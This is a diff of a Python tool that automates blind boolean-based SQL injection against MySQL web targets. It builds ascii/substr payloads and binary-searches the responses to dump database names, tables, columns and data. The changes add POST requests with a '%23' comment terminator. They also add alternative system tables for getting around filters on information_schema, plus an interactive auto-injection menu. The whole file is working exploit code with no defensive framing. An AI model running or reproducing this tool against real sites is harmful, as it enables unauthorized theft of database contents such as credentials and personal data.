@@ -5,14 +5,32 @@ class SQL_Injection:
     columns = []
     database = {}
     data = []
+    header = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    sysTables = { 
+        'information':{
+            'table':[ 'table_name','information_schema.tables','table_schema' ],
+            'column':[ 'cloumn_name','information_schema.columns','table_name' ]
+        },
+        'sys_xschema_flattened_keys':{
+            'table':[ 'table_name','sys.x$schema_flattened_keys','table_schema' ],
+            # 'column':('')
+        },
+        'mysql_innodb_table_stats':{
+            'table':[ 'table_name','mysql.innodb_table_stats','database_name' ]
+        }
+     }
     #初始化参数
-    def __init__(self,url,requireMethod,rightTXT,rightID,errorID,useFunc):
+    def __init__(self,url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable):
         self.url = url
         self.requireMethod = requireMethod.lower()
+        self.postParam = postParam
         self.rightTXT = rightTXT
         self.rightID = rightID
         self.errorID = errorID
         self.useFunc = useFunc
+        self.sysTab = sysTable
 
     #获取数据库名
     def getDatabase(self):
@@ -21,7 +39,7 @@ class SQL_Injection:
 
     #获取表名
     def getTables(self):
-        payload = self.useFunc+"(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d,"+self.rightID+","+self.errorID+")"
+        payload = self.useFunc+"(ascii(substr((select(group_concat("+self.sysTables[self.sysTab]['table'][0]+"))from("+self.sysTables[self.sysTab]['table'][1]+")where("+self.sysTables[self.sysTab]['table'][2]+"=database())),%d,1))>%d,"+self.rightID+","+self.errorID+")"
         self.tables = self.getResult(payload).split(',')
         print("result:"+str(self.tables))
 
@@ -49,9 +67,9 @@ class SQL_Injection:
             mid = (low+high) // 2
             while low < high:
                 if self.requireMethod == 'get':
-                    resp = requests.get(self.url+payload % (i,mid))
+                    resp = requests.get(self.url+payload % (i,mid)+'%23')
                 elif self.requireMethod == 'post':
-                    resp = requests.post(self.url,payload % (i,mid))
+                    resp = requests.post(self.url,self.postParam+payload % (i,mid)+'%23',headers=self.header)
                 if self.rightTXT in resp.text:
                     low = mid + 1
                 else:
@@ -66,17 +84,47 @@ class SQL_Injection:
 
 
 if __name__ == "__main__":
-    url = input("input url(e.g,'get:www.example.com?id=,post:www.example.com'):")#url
-    requireMethod = input("input require method(Get/Post):")#请求提交方式
-    rightTXT = input("input right string:")#正确结果的特征
-    rightID = input("input right id(the number while be used when the result is right):")#正确是使用的数字
-    errorID = input("input error id:")
-    useFunc = input("select function(if/elt):")
-    work = SQL_Injection(url,requireMethod,rightTXT,rightID,errorID,useFunc)
-    work.getTables()
-    work.getColumns()
-    while True:
-        table = input("input table which you want to dump:")
-        print("columns:"+str(work.database[table]))
-        columns = input("input columns(split by ','):")
-        work.getData(table,columns)
+    try:
+        while(True):
+            url = input("input url(e.g,'get:www.example.com?id=,post:www.example.com'):")#url
+            requireMethod = input("input require method(Get/Post):")#请求提交方式
+            if(requireMethod.lower() == 'post'):
+                postParam = input("input post param:")#格式是：id=
+            else:
+                postParam = ''
+            rightTXT = input("input right string:")#正确结果的特征
+            rightID = input("input right id(the number while be used when the result is right):")#正确是使用的数字
+            errorID = input("input error id:")
+            useFunc = input("select function(if/elt):")
+            sysTable = input("select systable(information_schema/sys_xschema_flattened_keys/mysql_innodb_table_stats):")
+            #选择注入的模式
+            selection = input('''
+                1.Auto injection
+                2.Get database name
+                3.Get tables name
+                4.Get columns name
+                5.Get data
+            ''')
+            if selection == '1': #自动注入
+                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
+                work.getDatabase()
+                work.getTables()
+                work.getColumns()
+                while True:
+                    table = input("input table which you want to dump:")
+                    print("columns:"+str(work.database[table]))
+                    columns = input("input columns(split by ','):")
+                    work.getData(table,columns)    
+            elif selection == '2': #只获取数据库名
+                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
+                work.getDatabase()
+            elif selection == '3': #只获取表名
+                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
+                work.getTables()
+            elif selection == '4': #只获取列名
+                pass
+            elif selection == '5': #获取数据
+                pass
+            
+    except KeyboardInterrupt:
+        print("bye~")
